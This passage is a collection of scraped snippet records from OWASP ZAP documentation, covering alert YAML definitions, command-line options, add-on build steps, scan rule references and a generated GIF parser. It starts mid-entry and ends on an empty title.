solution: "Validate Origin header on WebSocket connection handshake, to ensure only specified origins are allowed to connect. Also, WebSocket handshake should use random tokens, similar to anti CSRF tokens. "
references:
   - https://tools.ietf.org/html/rfc6455#section-10.2
other: "See also https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking or https://christian-schneider.net/CrossSiteWebSocketHijacking.html "
cwe: 346
wasc: 9
alerttags: 
  - CWE-346
  - OWASP_2017_A05
  - OWASP_2021_A01
  - WSTG-v42-CLNT-10
code: https://github.com/zaproxy/community-scripts/blob/main/active/Cross%20Site%20WebSocket%20Hijacking.js
linktext: "active/Cross Site WebSocket Hijacking.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/

----------------------------------------

TITLE: Running ZAP Automation Scan with Noir-discovered Endpoints
DESCRIPTION: This code snippet demonstrates how to use Noir to discover endpoints and then run a ZAP automation scan incorporating these endpoints. It uses the -openapifile and -openapitargeturl flags to include additional endpoints discovered by Noir.

LANGUAGE: sh
CODE:
# Discovering endpoints
noir -b ~/app_source -f oas3 --no-log -o doc.json

# Automation scan with endpoints
./zap.sh -openapifile ./doc.json \
    -openapitargeturl <TARGET> \
    -cmd -autorun zap.yaml <any other ZAP options>

----------------------------------------

TITLE: Groovy Support Add-on Version History in Markdown
DESCRIPTION: Formatted version history documentation showing the evolution of the Groovy Support add-on from initial release through version 3.0.0, including key changes and release dates.

LANGUAGE: markdown
CODE:
### Version 3.0.0 - TBD

* Promote to beta status
* Change add-on name/description and update help
* Start using Semantic Versioning.

### Version 2 - 2018-04-19

* Add help
* Add script templates

### Version 1 - 2018-03-15

* Initial release

----------------------------------------

TITLE: Directory Browsing Alert Configuration in YAML
DESCRIPTION: YAML configuration for the Directory Browsing security alert in ZAP, defining alert properties, risk level, solution, and associated security standards references.

LANGUAGE: yaml
CODE:
title: "Directory Browsing"
alertid: 10033
alertindex: 1003300
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Configure the web server to disable directory browsing."
references:
   - https://cwe.mitre.org/data/definitions/548.html
other: "Web server identified: Apache 2"
cwe: 548
wasc: 16
alerttags: 
  - CWE-548
  - OWASP_2017_A06
  - OWASP_2021_A05

----------------------------------------

TITLE: YAML Alert Configuration for User Agent Fuzzer
DESCRIPTION: YAML configuration block defining the User Agent Fuzzer alert properties including ID, type, risk level, and associated documentation links.

LANGUAGE: yaml
CODE:
title: "User Agent Fuzzer"
alertid: 10104
alertindex: 1010400
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Informational
solution: ""
references:
   - https://owasp.org/wstg
other: ""
alerttags: 
  - CUSTOM_PAYLOADS
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/UserAgentScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/UserAgentScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-10104

----------------------------------------

TITLE: Alert Override Basic Format
DESCRIPTION: Demonstrates the basic format for alert override entries, showing how to modify alert properties using append (+), prepend (-), or replace operations.

LANGUAGE: text
CODE:
<alertid>.<property> = [ + | - ] <your information>

----------------------------------------

TITLE: Defining Viewstate Scan Rule Alerts in YAML
DESCRIPTION: This YAML configuration defines multiple alerts related to Viewstate scanning in ZAP. It includes alert IDs, names, and types for various Viewstate-related security issues.

LANGUAGE: yaml
CODE:
---
title: "Viewstate"
alertid: 10032
alertindex: 1003200
alerttype: "Passive"
status: release
type: alertset
alerts:
   10032-1:
      alertid: 10032-1
      name: "Potential IP Addresses Found in the Viewstate"
   10032-2:
      alertid: 10032-2
      name: "Emails Found in the Viewstate"
   10032-3:
      alertid: 10032-3
      name: "Old Asp.Net Version in Use"
   10032-4:
      alertid: 10032-4
      name: "Viewstate without MAC Signature (Unsure)"
   10032-5:
      alertid: 10032-5
      name: "Viewstate without MAC Signature (Sure)"
   10032-6:
      alertid: 10032-6
      name: "Split Viewstate in Use"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java"

----------------------------------------

TITLE: Configuring 'Retrieved from Cache' Alert in YAML
DESCRIPTION: YAML configuration for the 'Retrieved from Cache' alert in ZAP. It defines the alert ID, index, type, status, and specific sub-alerts with their respective IDs and names.

LANGUAGE: yaml
CODE:
title: "Retrieved from Cache"
alertid: 10050
alertindex: 1005000
alerttype: "Passive"
status: release
type: alertset
alerts:
   10050-1:
      alertid: 10050-1
      name: "Retrieved from Cache"
   10050-2:
      alertid: 10050-2
      name: "Retrieved from Cache"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/RetrievedFromCacheScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/RetrievedFromCacheScanRule.java"

----------------------------------------

TITLE: Creating Test File in Mapped Docker Volume
DESCRIPTION: This command creates a test file in a mapped Docker volume to verify write permissions. It helps diagnose issues related to file creation and permissions when using ZAP in Docker.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable touch /zap/wrk/test.txt

----------------------------------------

TITLE: Deploying New Add-on (Linux/MacOS)
DESCRIPTION: Gradle command to deploy the new add-on on Linux or MacOS systems.

LANGUAGE: bash
CODE:
./gradlew addOns:myaddon:copyZapAddOn

----------------------------------------

TITLE: Alert Filters YAML Front Matter
DESCRIPTION: YAML configuration metadata for the Alert Filters documentation page, specifying the add-on ID, version and page properties.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Alert Filters
type: userguide
weight: 1
cascade:
  addon:
    id: alertFilters
    version: 23.0.0
---

----------------------------------------

TITLE: Implementing User Controllable Charset Scan Rule in Java for ZAP
DESCRIPTION: This code snippet implements a passive scan rule in ZAP to detect user-controllable charset declarations in HTTP responses. It checks query string parameters and POST data for potential charset manipulation, which could lead to XSS or other attacks.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/UserControlledCharsetScanRule.java

----------------------------------------

TITLE: Modern Web App Detection Alert Configuration
DESCRIPTION: YAML frontmatter configuration for the Modern Web Application detection alert in ZAP. Defines alert properties including ID, risk level, solution recommendations, and associated code references.

LANGUAGE: yaml
CODE:
---
title: "Modern Web Application"
alertid: 10109
alertindex: 1010900
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "This is an informational alert and so no changes are required."
other: "Links have been found with a target of '_self' - this is often used by modern frameworks to force a full page reload."
alerttags: 
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ModernAppDetectionScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/ModernAppDetectionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10109
---

----------------------------------------

TITLE: Checking for User-Initiated Scan Stop in ZAP Active Scan Rules
DESCRIPTION: Periodically check if the scan has been stopped by the user to allow for clean termination of the scan rule.

LANGUAGE: Java
CODE:
if (isStop()) {
    return; // User stopped the scan
}

----------------------------------------

TITLE: Configuring ZAP HUD in Daemon Mode
DESCRIPTION: Command line configuration option to enable the HUD when running ZAP in daemon mode without launching a browser. This setting must be passed as a command line argument when starting ZAP.

LANGUAGE: bash
CODE:
-config hud.enabledForDaemon=true

----------------------------------------

TITLE: Implementing scan() Method for Parameter-based Active Scanning in ZAP
DESCRIPTION: When extending AbstractAppParamPlugin, you implement this version of scan() to attack specific parameters in each request.

LANGUAGE: Java
CODE:
public void scan(HttpMessage msg, String param, String value) {
    // Attack the specified parameter
}

----------------------------------------

TITLE: Configuring DOM XSS Scanner Rule Reference
DESCRIPTION: Source code link to the DOM XSS Scanner implementation that handles browser-based DOM XSS vulnerability scanning. The scanner supports Firefox and Chrome browsers in both GUI and headless modes.

LANGUAGE: markdown
CODE:
Latest code: [DomXssScanRule.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/domxss/src/main/java/org/zaproxy/zap/extension/domxss/DomXssScanRule.java)

----------------------------------------

TITLE: Context API Response Format Change
DESCRIPTION: Demonstrates the modified JSON response format for context-related API endpoints, where data is now wrapped in a context object.

LANGUAGE: json
CODE:
{"context":{"id":"1", ..., "inScope":"true","loggedOutPattern":""}}

----------------------------------------

TITLE: Security Alert Configuration in YAML
DESCRIPTION: YAML configuration for a security alert that detects Content Security Policy violation reporting. Includes alert metadata, risk assessment, and reference links.

LANGUAGE: yaml
CODE:
title: "Content Security Policy Violations Reporting Enabled"
alertid: 100004
alertindex: 10000400
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Informational
solution: "Site owner will be notified at each policies violations, so, start by analyzing if a real monitoring of the notifications is in place before to use fuzzing or to be more aggressive. "
references:
   - https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Using_CSP_violation_reports
other: ""
cwe: 200
wasc: 13
alerttags: 
  - CWE-200
code: https://github.com/zaproxy/community-scripts/blob/main/passive/detect_csp_notif_and_reportonly.js
linktext: "passive/detect_csp_notif_and_reportonly.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/

----------------------------------------

TITLE: Cloning Additional ZAP Repositories
DESCRIPTION: These commands clone the ZAP HUD and core help repositories, which are optional components for ZAP.

LANGUAGE: bash
CODE:
git clone https://github.com/zaproxy/zap-hud.git
git clone https://github.com/zaproxy/zap-core-help.git

----------------------------------------

TITLE: Updating Message Properties for New Add-on
DESCRIPTION: Changes to the Messages.properties file to update keys and strings for the new add-on.

LANGUAGE: properties
CODE:
myaddon.api.action.helloWorld = Logs "hello world called" with debug level.
myaddon.desc = My Add-on
myaddon.error.nofile = File not found : {0}
myaddon.panel.msg = <html>This is My Add-on's status panel</html>
myaddon.panel.title = My Add-on
myaddon.popup.msg = Example right click menu invoked for:\n {0}
myaddon.popup.title = My Add-on: Example right click menu
myaddon.topmenu.tools.msg = My Add-on: Example message
myaddon.topmenu.tools.title = My Add-on: Example top menu

----------------------------------------

TITLE: Configuring Dangerous JS Functions Alert in YAML
DESCRIPTION: YAML configuration for a ZAP passive scan rule that detects dangerous JavaScript functions. It defines alert properties including ID, type, risk level, and associated tags.

LANGUAGE: yaml
CODE:
---
title: "Dangerous JS Functions"
alertid: 10110
alertindex: 1011000
alerttype: "Passive"
alertcount: 1
status: beta
type: alert
risk: Low
solution: "See the references for security advice on the use of these functions."
references:
   - https://angular.io/guide/security
other: ""
cwe: 749
alerttags: 
  - CUSTOM_PAYLOADS
  - CWE-749
  - OWASP_2021_A04
  - WSTG-v42-CLNT-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/JsFunctionScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/JsFunctionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules-beta/#id-10110
---

----------------------------------------

TITLE: Registering OAST Request Handler in JavaScript for OWASP ZAP
DESCRIPTION: This snippet demonstrates how to register a request handler for OAST in OWASP ZAP. The handler function logs details about the request, and is added to the BOAST service.

LANGUAGE: javascript
CODE:
function requestHandler(request) {
    print("Source: ", request.getSource())
    print("Referer: ", request.getReferer())
    print("Handler: ", request.getHandler())
    print()
}

boast.addOastRequestHandler(requestHandler)

----------------------------------------

TITLE: YAML Front Matter Configuration for ZAP Import/Export Documentation
DESCRIPTION: YAML configuration block defining metadata for the Import/Export documentation page, including title, type, weight and add-on details.

LANGUAGE: yaml
CODE:
title: Import/Export
type: userguide
weight: 1
cascade:
  addon:
    id: exim
    version: 0.13.0

----------------------------------------

TITLE: Unit Test Reference for Cross Site Scripting Scanner in Java
DESCRIPTION: Reference to a unit test file that demonstrates how to properly test the Cross Site Script V2 scanner rule. This serves as an example for reproducing false negative issues programmatically.

LANGUAGE: java
CODE:
TestCrossSiteScriptV2UnitTest.java

----------------------------------------

TITLE: Verification Request Alert Definition in YAML
DESCRIPTION: YAML configuration defining a passive scanner alert for authentication verification request detection. Specifies alert metadata including ID, risk level, solution recommendations and references.

LANGUAGE: yaml
CODE:
title: "Verification Request Identified"
alertid: 10113
alertindex: 1011300
alerttype: "Passive"
alertcount: 1
status: beta
type: alert
risk: Informational
solution: "This is an informational alert rather than a vulnerability and so there is nothing to fix."
references:
   - https://www.zaproxy.org/docs/desktop/addons/authentication-helper/verif-id
other: ""
alerttags: 
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/authhelper/src/main/java/org/zaproxy/addon/authhelper/VerificationDetectionScanRule.java
linktext: "org/zaproxy/addon/authhelper/VerificationDetectionScanRule.java"

----------------------------------------

TITLE: Traversing .DS_Store B-tree in ZAP Spider
DESCRIPTION: This Java code traverses the B-tree structure of a .DS_Store file, starting from the master block and recursively exploring each node.

LANGUAGE: java
CODE:
for (MasterBlockRef masterBlockRef : dsStore.buddyAllocatorBody().directories()) {
    // Each B-tree directory has one master block comprising metadata.
    MasterBlock masterBlock = masterBlockRef.masterBlock();
    getLogger().debug("Records: {}", masterBlock.numRecords());

    Block rootBlock = masterBlock.rootBlock();

    // Traverse recursively the B-tree from its root block.
    try {
        traverse(rootBlock, ctx);
    } catch (Exception e) {
        getLogger().warn("There was an issue parsing the .DS_Store. {}", e.getMessage());
        getLogger().debug(e, e);
    }
}

----------------------------------------

TITLE: Setting File Transfer Directory Command Line Configuration in ZAP
DESCRIPTION: Command line parameter to specify the directory used for file transfers via the ZAP API

LANGUAGE: bash
CODE:
-config api.xferdir=/full/path/to/dir

----------------------------------------

TITLE: YAML Configuration for SameSite Cookie Detection Alert
DESCRIPTION: Alert configuration metadata for the ZAP passive scanner script that detects SameSite cookie attribute protection. Defines alert properties, risk level, solution guidance, and relevant security references.

LANGUAGE: yaml
CODE:
title: "SameSite Cookie Attribute Protection Used"
alertid: 100005
alertindex: 10000500
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Informational
solution: "CSRF possible vulnerabilities presents on the site will be mitigated depending on the browser used by the user (browser defines the support level for this cookie attribute). "
references:
   - https://tools.ietf.org/html/draft-west-first-party-cookies
   - https://chloe.re/2016/04/13/goodbye-csrf-samesite-to-the-rescue
other: ""
cwe: 352
wasc: 9
alerttags: 
  - CWE-352
code: https://github.com/zaproxy/community-scripts/blob/main/passive/detect_samesite_protection.js
linktext: "passive/detect_samesite_protection.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/

----------------------------------------

TITLE: UI Component Example - Java JLabel Usage
DESCRIPTION: Example syntax reference for properly using the labelFor attribute on JLabel components to improve UI accessibility. References Java Swing documentation.

LANGUAGE: java
CODE:
JLabel label = new JLabel();\nlabel.setLabelFor(component);

----------------------------------------

TITLE: Updating Gradle Build File for New Add-on
DESCRIPTION: Modifications to the Gradle build file to set the version, description, and name for the new add-on.

LANGUAGE: kotlin
CODE:
version = "0.0.1"
description = "A new description."

zapAddOn {
    addOnName.set("My AddOn")
    zapVersion.set("2.10.0")

    manifest {
        author.set("ZAP Dev Team")
    }
}

----------------------------------------

TITLE: Defining YAML Frontmatter for Import URLs Documentation
DESCRIPTION: YAML frontmatter that specifies metadata for the Import URLs add-on documentation page, including title, type, weight, and add-on details.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Import URLs
type: userguide
weight: 1
cascade:
  addon:
    id: importurls
    version: 9.0.0
---

----------------------------------------

TITLE: Implementing Base64 Disclosure Detection in Java for ZAP
DESCRIPTION: This code snippet is part of a passive scan rule in OWASP ZAP that detects Base64 encoded data, which may be related to unprotected ViewStates. It's implemented in Java and extends ZAP's passive scan functionality.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java

----------------------------------------

TITLE: Configuring ZAP Alert Rules for Malicious Polyfill Script Detection
DESCRIPTION: YAML configuration that defines alert rules for detecting JavaScript polyfill scripts served from potentially malicious domains. The configuration establishes two alert variations (10115-1 and 10115-2) for the passive scanner to flag suspicious polyfill CDN sources.

LANGUAGE: yaml
CODE:
title: "Script Served From Malicious Domain (polyfill)"
alertid: 10115
alertindex: 1011500
alerttype: "Passive"
status: release
type: alertset
alerts:
   10115-1:
      alertid: 10115-1
      name: "Script Served From Malicious Domain (polyfill)"
   10115-2:
      alertid: 10115-2
      name: "Script Served From Malicious Domain (polyfill)"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/PolyfillCdnScriptScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/PolyfillCdnScriptScanRule.java"

----------------------------------------

TITLE: Generated Python Parser for GIF Format
DESCRIPTION: This Python code is generated by the Kaitai Struct compiler based on the YAML description of the GIF format. It provides a class structure for parsing GIF files.

LANGUAGE: python
CODE:
# This is a generated file! Please edit source .ksy file and use kaitai-struct-compiler to rebuild

import kaitaistruct
from kaitaistruct import KaitaiStruct, KaitaiStream, BytesIO


if getattr(kaitaistruct, 'API_VERSION', (0, 9)) < (0, 9):
    raise Exception("Incompatible Kaitai Struct Python API: 0.9 or later is required, but you have %s" % (kaitaistruct.__version__))

class Gif(KaitaiStruct):
    def __init__(self, _io, _parent=None, _root=None):
        self._io = _io
        self._parent = _parent
        self._root = _root if _root else self
        self._read()

    def _read(self):
        self.header = Gif.Header(self._io, self, self._root)
        self.logical_screen = Gif.LogicalScreen(self._io, self, self._root)

    class Header(KaitaiStruct):
        def __init__(self, _io, _parent=None, _root=None):
            self._io = _io
            self._parent = _parent
            self._root = _root if _root else self
            self._read()

        def _read(self):
            self.magic = self._io.read_bytes(3)
            if not self.magic == b"\x47\x49\x46":
                raise kaitaistruct.ValidationNotEqualError(b"\x47\x49\x46", self.magic, self._io, u"/types/header/seq/0")
            self.version = self._io.read_bytes(3)


    class LogicalScreen(KaitaiStruct):
        def __init__(self, _io, _parent=None, _root=None):
            self._io = _io
            self._parent = _parent
            self._root = _root if _root else self
            self._read()

        def _read(self):
            self.image_width = self._io.read_u2le()
            self.image_height = self._io.read_u2le()
            self.flags = self._io.read_u1()
            self.bg_color_index = self._io.read_u1()
            self.pixel_aspect_ratio = self._io.read_u1()

----------------------------------------

TITLE: Link to Base64 Disclosure Implementation
DESCRIPTION: Reference to Java implementation for detecting Base64 encoded data disclosures and ASP.NET ViewState vulnerabilities.

LANGUAGE: markdown
CODE:
[Base64Disclosure.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/Base64Disclosure.java)

----------------------------------------

TITLE: Server Header Information Disclosure Alert Definition
DESCRIPTION: YAML frontmatter defining metadata for a security alert related to server header information disclosure. Includes alert ID, risk level, solution recommendations, and associated security standards (CWE, WASC).

LANGUAGE: yaml
CODE:
---
title: "Information Disclosure - Server Header"
alertid: 100019
alertindex: 10001900
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Low
solution: "Ensure that your web server, application server, load balancer, etc. is configured to suppress the 'Server' header  or provide generic details. "
other: ""
cwe: 200
wasc: 13
alerttags: 
  - CWE-200
code: https://github.com/zaproxy/community-scripts/blob/main/passive/Server%20Header%20Disclosure.js
linktext: "passive/Server Header Disclosure.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/
---

----------------------------------------

TITLE: Defining GIF File Format with Kaitai Struct YAML
DESCRIPTION: This YAML snippet describes the structure of a GIF file using Kaitai Struct. It defines the header and logical screen components of the GIF format.

LANGUAGE: yaml
CODE:
meta:
  id: gif
  file-extension: gif
  endian: le
seq:
  - id: header
    type: header
  - id: logical_screen
    type: logical_screen
types:
  header:
    seq:
      - id: magic
        contents: 'GIF'
      - id: version
        size: 3
  logical_screen:
    seq:
      - id: image_width
        type: u2
      - id: image_height
        type: u2
      - id: flags
        type: u1
      - id: bg_color_index
        type: u1
      - id: pixel_aspect_ratio
        type: u1

----------------------------------------

TITLE: Enabling File Transfer Command Line Configuration in ZAP
DESCRIPTION: Command line parameter to enable file transfer functionality in the ZAP API

LANGUAGE: bash
CODE:
-config api.filexfer=true

----------------------------------------

TITLE: Detecting Base64-encoded Strings in HTTP Responses (JavaScript)
DESCRIPTION: This script passively scans HTTP response bodies for Base64-encoded strings that may contain sensitive information. It is part of the ZAP (Zed Attack Proxy) community scripts collection.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/find%20base64%20strings.js

----------------------------------------

TITLE: Package Declaration Example - ZAP Core
DESCRIPTION: Standard package declaration format for core ZAP classes under the main org.zaproxy.zap namespace.

LANGUAGE: java
CODE:
package org.zaproxy.zap;

----------------------------------------

TITLE: Setting Java Options for Font Rendering in Linux Environment
DESCRIPTION: This code snippet demonstrates how to set a Java option in the Linux environment to improve font rendering in ZAP. It specifies the use of system anti-aliasing font settings.

LANGUAGE: bash
CODE:
_JAVA_OPTIONS='-Dawt.useSystemAAFontSettings=on'

----------------------------------------

TITLE: Implementing Polyfill CDN Script Scan Rule in Java
DESCRIPTION: This code snippet represents the implementation of a passive scan rule to detect scripts loaded from potentially malicious 'polyfill' domains. It is part of the ZAP (Zed Attack Proxy) project's extensions.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/PolyfillCdnScriptScanRule.java

----------------------------------------

TITLE: ZAP Baseline YAML Configuration
DESCRIPTION: Example YAML configuration file generated by the baseline scan when using the Automation Framework, showing job configurations for scanning.

LANGUAGE: yaml
CODE:
env:
  contexts:
  - name: baseline
    urls:
    - https://www.example.com
  parameters:
    failOnError: true
    progressToStdout: false
jobs:
- install:
  - pscanrulesBeta
  type: addOns
  uninstall: []
- parameters:
    enableTags: false
    maxAlertsPerRule: 10
  type: passiveScan-config
- parameters:
    maxDuration: 1
    url: https://www.example.com
  type: spider
- parameters:
    maxDuration: 1
    url: https://www.example.com
  type: spiderAjax
- parameters:
    maxDuration: 0
  type: passiveScan-wait
- parameters:
    format: Long
    summaryFile: /zap/zap_out.json
  type: outputSummary

----------------------------------------

TITLE: Building ZAProxy Website Project
DESCRIPTION: Run the build script to generate the website files.

LANGUAGE: sh
CODE:
$ npm run build

----------------------------------------

TITLE: Viewing Template Details in ZAP Report Generation API
DESCRIPTION: This API view operation allows users to see details of a specific report template. It requires a template parameter.

LANGUAGE: markdown
CODE:
* templateDetails (template\*): View details of the specified template.

----------------------------------------

TITLE: Implementing Information in Storage Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the implementation of a scan rule in ZAP (Zed Attack Proxy) for detecting information stored in browser localStorage. It is part of the client-side integration add-on and performs passive scanning.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/InformationInStorageScanRule.java

----------------------------------------

TITLE: Updating Website Statistics with GitHub Actions
DESCRIPTION: GitHub Actions workflow for monthly updates of website statistics for ZAP.

LANGUAGE: yaml
CODE:
update-website-stats.yml

----------------------------------------

TITLE: HTTP Message Access Methods in Java
DESCRIPTION: Common methods to access HTTP request and response data within ZAP passive scan rules.

LANGUAGE: java
CODE:
msg.getRequestHeader().getMethod()
msg.getRequestHeader().getHttpCookies()
msg.getRequestHeader().getHeaders()
msg.getRequestHeader().getContentLength()
msg.getRequestBody().toString()
msg.getResponseHeader().getHeaders()
msg.getResponseHeader().getStatusCode()
msg.getResponseBody().toString()

----------------------------------------

TITLE: Escaping Special Characters in URL Regex for ZAP Exclusions
DESCRIPTION: Demonstrates how to use the \Q...\E escape sequence for literal interpretation of characters in URL regular expressions, particularly useful when excluding URLs in ZAP dialogs.

LANGUAGE: text
CODE:
\Qsubdomain.example.com/path?a=\E\\E\Q&moredata=2\E

----------------------------------------

TITLE: Detecting HTML Comments in JavaScript for ZAP
DESCRIPTION: This script is used by ZAProxy to passively scan for HTML comments that may contain sensitive information. It is part of the community scripts collection and helps identify potential information disclosure vulnerabilities.

LANGUAGE: JavaScript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/Find%20HTML%20Comments.js

----------------------------------------

TITLE: Alert Tab YAML Frontmatter
DESCRIPTION: YAML frontmatter configuration for the alerts tab documentation page, specifying metadata like title, type and weight.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Alerts tab
type: userguide
weight: 8
---

----------------------------------------

TITLE: Alert Override Example Configuration
DESCRIPTION: Example showing how to override XSS alert solutions and add custom bug tracker tags. Demonstrates practical usage of alert overrides.

LANGUAGE: properties
CODE:
# 40012 = Reflected XSS
40012.solution = Follow our company specific guidelines at http://internet.example.com/xss.html
40012.tag.Bug\ Tracker\ URL = https://example.com/issues/1234

----------------------------------------

TITLE: YAML Frontmatter Configuration for ViewState Add-on Documentation
DESCRIPTION: YAML configuration block defining the page metadata, add-on ID, version and navigation settings for the ViewState documentation.

LANGUAGE: yaml
CODE:
title: ViewState
type: userguide
weight: 1
cascade:
  addon:
    id: viewstate
    version: 3.0.0

----------------------------------------

TITLE: Implementing Source Code Disclosure File Inclusion Scan Rule in Java
DESCRIPTION: This code snippet represents the implementation of a scan rule for detecting source code disclosure through file inclusion vulnerabilities. It is part of the ZAP extensions for active scanning.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/SourceCodeDisclosureFileInclusionScanRule.java

----------------------------------------

TITLE: Collecting and Processing Statistics in Python
DESCRIPTION: Main Python script for collecting and processing statistics from various sources like Bitly, Docker, and GitHub.

LANGUAGE: python
CODE:
stats.py

----------------------------------------

TITLE: Importing Java Scan Rule Classes
DESCRIPTION: Code examples of various scan rule Java class imports from the pscanrules package

LANGUAGE: java
CODE:
import org.zaproxy.zap.extension.pscanrules.AntiClickjackingScanRule;
import org.zaproxy.zap.extension.pscanrules.ApplicationErrorScanRule;
import org.zaproxy.zap.extension.pscanrules.BigRedirectsScanRule;
// Additional scan rule imports...

----------------------------------------

TITLE: Windows ZAP Startup Path
DESCRIPTION: Location of the ZAP startup script on Windows systems

LANGUAGE: shell
CODE:
C:\Program Files (x86)\ZAP\Zed Attack Proxy\zap.bat

----------------------------------------

TITLE: Data Driven Content URL Examples
DESCRIPTION: URL patterns showing how path elements can contain data rather than structural information.

LANGUAGE: http
CODE:
https://www.example.com/app/company1/aaa?ddd=eee
https://www.example.com/app/company2/aaa?ddd=fff
https://www.example.com/app/company3/aaa?ddd=ggg

----------------------------------------

TITLE: Parsing X-ChromeLogger-Data Header Content
DESCRIPTION: Example of base64 decoded X-ChromeLogger-Data header content showing sensitive route matching and security token information that could be leaked through the header.

LANGUAGE: json
CODE:
{
  "version": "4.0",
  "columns": ["label", "log", "backtrace", "type"],
  "rows": [
    ["request", "Matched route \"app_security_login\" (parameters: \"_controller\": \"BackEnd\\AppBundle\\Controller\\SecurityController::loginAction\", \"_route\": \"app_security_login\")", "unknown", "info"],
    ["security", "Populated SecurityContext with an anonymous Token", "unknown", "info"]
  ],
  "request_uri": "/login"
}

----------------------------------------

TITLE: Detecting Google API Keys in HTTP Responses using ZAP Passive Script
DESCRIPTION: This script passively scans HTTP responses for Google API Keys. It is part of the ZAProxy community scripts and helps identify potential information disclosure vulnerabilities.

LANGUAGE: javascript
CODE:
https://github.com/zaproxy/community-scripts/blob/main/passive/google_api_keys_finder.js

----------------------------------------

TITLE: Referencing ZAP API OpenAPI Definition in Markdown
DESCRIPTION: Markdown snippet providing a link to the OpenAPI definition for the ZAP API in the main repository.

LANGUAGE: markdown
CODE:
An [OpenAPI definition](https://swagger.io/) for the ZAP API is [available in the main repository](https://raw.githubusercontent.com/zaproxy/zap-api-docs/main/openapi.yaml), which can be used to generate custom API clients.

----------------------------------------

TITLE: Configuring Alert Override Format
DESCRIPTION: Shows the basic format for overriding alert properties in ZAP. Properties can be modified by using alertid and property combinations.

LANGUAGE: properties
CODE:
<alertid>.<property> = [ + | - ] <your information>

----------------------------------------

TITLE: Implementing CSP Header Missing Scan Rule in Java for ZAP
DESCRIPTION: This code snippet implements the Content Security Policy Missing Scan Rule for the OWASP ZAP project. It checks for the absence of the CSP header in HTTP responses and raises an alert if not found.

LANGUAGE: java
CODE:
org/zaproxy/zap/extension/pscanrules/ContentSecurityPolicyMissingScanRule.java

----------------------------------------

TITLE: Configuring Path Traversal Alerts in YAML
DESCRIPTION: YAML configuration defining multiple Path Traversal alert types with unique IDs. The configuration establishes alert metadata including ID, name, status and type for Path Traversal vulnerability scanning.

LANGUAGE: yaml
CODE:
title: "Path Traversal"
alertid: 6
alertindex: 600
alerttype: "Active"
status: release
type: alertset
alerts:
   6-1:
      alertid: 6-1
      name: "Path Traversal"
   6-2:
      alertid: 6-2
      name: "Path Traversal"
   6-3:
      alertid: 6-3
      name: "Path Traversal"
   6-4:
      alertid: 6-4
      name: "Path Traversal"
   6-5:
      alertid: 6-5
      name: "Path Traversal"

----------------------------------------

TITLE: Excluding Technologies in ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to exclude specific technologies from a ZAP context in the Automation Framework configuration. It shows how to list technologies that do not apply to the target application.

LANGUAGE: yaml
CODE:
      technology:
        exclude:
        - Db
        - C
        - PHP	

----------------------------------------

TITLE: Mac ZAP Startup Path
DESCRIPTION: Location of the ZAP startup script on Mac systems

LANGUAGE: shell
CODE:
/Applications/ZAP.app/Contents/Java/zap.sh

----------------------------------------

TITLE: Basic API Scanning with ZAP Docker
